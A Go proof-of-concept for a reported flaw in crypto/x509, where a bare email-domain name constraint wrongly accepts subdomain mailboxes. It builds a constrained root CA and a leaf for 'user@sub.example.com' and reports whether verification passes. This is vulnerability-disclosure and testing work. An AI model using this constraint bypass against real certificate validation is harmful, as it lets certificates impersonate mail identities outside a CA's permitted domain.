// PoC for finding 038: bare rfc822Name email name constraints incorrectly
// match subdomains.
//
// RFC 5280 distinguishes:
//   - "example.com"  matches mailboxes with domain == example.com only.
//   - ".example.com" matches mailboxes whose domain is a strict subdomain.
//
// The unpatched implementation in src/crypto/x509/constraints.go stores
// bare email-domain constraints and queries them through dnsConstraints
// (DNS-suffix matching). DNS suffix logic considers "sub.example.com" a
// match for "example.com", so a CA permitted only "example.com" emails
// also authorizes "user@sub.example.com".
//
// This PoC builds a CA with PermittedEmailAddresses = ["example.com"] and
// a leaf with email SAN "user@sub.example.com", and shows Verify accepts.
package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"fmt"
	"math/big"
	"os"
	"time"
)

func main() {
	rootKey, _ := rsa.GenerateKey(rand.Reader, 2048)
	rootTpl := &x509.Certificate{
		SerialNumber:            big.NewInt(1),
		Subject:                 pkix.Name{CommonName: "poc-038 root"},
		NotBefore:               time.Now().Add(-time.Hour),
		NotAfter:                time.Now().Add(24 * time.Hour),
		KeyUsage:                x509.KeyUsageCertSign,
		BasicConstraintsValid:   true,
		IsCA:                    true,
		PermittedEmailAddresses: []string{"example.com"},
	}
	rootDER, err := x509.CreateCertificate(rand.Reader, rootTpl, rootTpl, &rootKey.PublicKey, rootKey)
	if err != nil {
		panic(err)
	}
	root, _ := x509.ParseCertificate(rootDER)

	leafKey, _ := rsa.GenerateKey(rand.Reader, 2048)
	leafTpl := &x509.Certificate{
		SerialNumber:   big.NewInt(2),
		Subject:        pkix.Name{CommonName: "poc-038 leaf"},
		NotBefore:      time.Now().Add(-time.Hour),
		NotAfter:       time.Now().Add(24 * time.Hour),
		KeyUsage:       x509.KeyUsageDigitalSignature,
		ExtKeyUsage:    []x509.ExtKeyUsage{x509.ExtKeyUsageEmailProtection},
		EmailAddresses: []string{"user@sub.example.com"},
	}
	leafDER, err := x509.CreateCertificate(rand.Reader, leafTpl, root, &leafKey.PublicKey, rootKey)
	if err != nil {
		panic(err)
	}
	leaf, _ := x509.ParseCertificate(leafDER)

	roots := x509.NewCertPool()
	roots.AddCert(root)

	opts := x509.VerifyOptions{
		Roots:       roots,
		KeyUsages:   []x509.ExtKeyUsage{x509.ExtKeyUsageEmailProtection},
		CurrentTime: time.Now(),
	}

	chains, err := leaf.Verify(opts)
	fmt.Println("CA permitted email constraint: example.com (bare, no leading dot)")
	fmt.Println("Leaf email SAN:                user@sub.example.com")
	fmt.Println("EXPECTED: bare 'example.com' constraint must NOT permit a subdomain mailbox")
	if err == nil {
		fmt.Println("GOT:      err == nil; verified", len(chains), "chain(s)")
		fmt.Println("BUG REPRODUCED: bare email constraint matched subdomain.")
		return
	}
	fmt.Println("GOT:      err =", err, "(bug did not reproduce)")
	os.Exit(2)
}
